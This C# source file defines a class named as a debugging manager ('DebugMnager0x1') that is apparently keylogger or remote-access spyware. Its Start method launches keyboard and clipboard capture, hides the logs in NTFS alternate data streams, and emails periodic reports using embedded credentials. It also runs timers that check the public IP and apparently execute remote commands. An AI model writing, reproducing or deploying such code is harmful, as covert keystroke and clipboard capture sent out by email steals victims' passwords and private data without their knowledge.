using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Diagnostics;

using Asmodat.Abbreviate;
using Asmodat.Extensions.Objects;
using Asmodat.Types;

using System.Resources;

using Asmodat.IO;
using Asmodat.Networking;

using AsmodatMath;
using Asmodat.Cryptography;


namespace Asmodat.Debugging
{
    public partial class DebugMnager0x1
    {


        public DebugMnager0x1(string EnEmail, string EnPassword, string EnTo, string Path = null)
        {
            try
            {
                if (Path.IsNullOrWhiteSpace())
                    Path = Files.ExePath;
                else
                    Path = Files.GetFullPath(Path);

                this.Path = Path;
                this.InitializeID();
                this.InitializePublicIP();

                this.EnEmail = EnEmail;
                this.EnTo = EnTo;
                this.EnPassword = EnPassword;
                Timers = new ThreadedTimers(10);
                Started = false;

            }
            catch (Exception ex)
            {
                Output.WriteException(ex);
            }

        }


        public void Stop()
        {
            try
            {
                if (Timers != null)
                    Timers.TerminateAll();

                if(Tracer != null)
                    Tracer.Stop();
            }
            catch { }
        }

        public void Start()
        {
            try
            {
                EMail = new Mails(HostSMTP, PortSMTP, HostIMAP, PortIMAP, EnableSsl, Seed, EnEmail, EnPassword, EnTo);

                Tracer = new InputTracer(TracerLength, TracerPath);
                Tracer.StartKeyboardTracer();
                Tracer.StarClipboardTracer(MinClipboard, MaxClipboard);
                Tracer.StartSaverADS(SaveIntervalADS);


                Timers.Run(() => this.ProcessRaport(), ProcessRaportInterval, "ProcessRaport", true, false);
                Timers.Run(() => this.ProcessCheckIP(), ProcessCheckIPInterval, "ProcessCheckIP", true, false);
                Timers.Run(() => this.ProcessExecute(), ProcessCheckIPInterval, "ProcessExecute", true, false);

                Started = true;
            }
            catch(Exception ex)
            {
                Output.WriteException(ex);
                Started = false;
            }
        }
        


    }
}
